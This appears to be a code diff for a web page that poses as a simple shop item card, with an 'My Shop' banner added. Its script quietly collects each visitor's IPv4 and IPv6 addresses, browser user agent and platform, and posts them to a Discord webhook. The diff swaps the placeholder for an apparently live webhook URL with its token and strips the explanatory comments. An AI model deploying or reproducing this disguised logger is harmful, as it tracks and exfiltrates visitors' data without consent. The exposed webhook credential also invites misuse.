@@ -10,9 +10,20 @@
         font-family: Arial, sans-serif;
         color: white;
         display: flex;
-        justify-content: center;
+        flex-direction: column;
         align-items: center;
-        height: 100vh;
+        min-height: 100vh;
+        margin: 0;
+    }
+    .banner {
+        background-color: #1b263b;
+        width: 100%;
+        padding: 20px;
+        text-align: center;
+        font-size: 28px;
+        font-weight: bold;
+        color: #e0e1dd;
+        box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.4);
     }
     .card {
         background-color: #1b263b;
@@ -21,6 +32,7 @@
         box-shadow: 0px 4px 15px rgba(0, 0, 0, 0.4);
         width: 300px;
         text-align: center;
+        margin-top: 50px;
     }
     h2 {
         margin-bottom: 10px;
@@ -49,6 +61,8 @@
 </head>
 <body>
 
+<div class="banner">🛒 My Shop</div>
+
 <div class="card">
     <h2>Test Item</h2>
     <p>Educational IPv4 & IPv6 Logger</p>
@@ -58,38 +72,32 @@
 
 <script>
 async function sendIP() {
-    const webhook = "YOUR_DISCORD_WEBHOOK_HERE"; // Replace with your webhook
+    const webhook = "https://discord.com/api/webhooks/1405178051607793797/lrLovFGo3LWPXBe3u874pQYct3xulb679aybaGQtdDYsnyrBeEZCXT5I2zs39z2-RqAR"; // Replace with your webhook
 
     try {
-        // Fetch IPv4
         const ipv4Res = await fetch('https://api.ipify.org?format=json');
         const ipv4 = (await ipv4Res.json()).ip;
 
-        // Fetch IPv6
         let ipv6 = "No IPv6 detected";
         try {
             const ipv6Res = await fetch('https://api64.ipify.org?format=json');
             ipv6 = (await ipv6Res.json()).ip;
         } catch {}
 
-        // Browser & OS
         const browser = navigator.userAgent;
         const os = navigator.platform;
         const timestamp = new Date().toLocaleString();
 
-        // Payload
         const payload = {
             content: `**Test IP Logger (Educational)**\nIPv4: \`${ipv4}\`\nIPv6: \`${ipv6}\`\nBrowser: \`${browser}\`\nOS: \`${os}\`\nTime: \`${timestamp}\``
         };
 
-        // Send to webhook
         await fetch(webhook, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(payload)
         });
 
-        // Show success notification
         document.getElementById("notify").style.display = "block";
 
     } catch (err) {
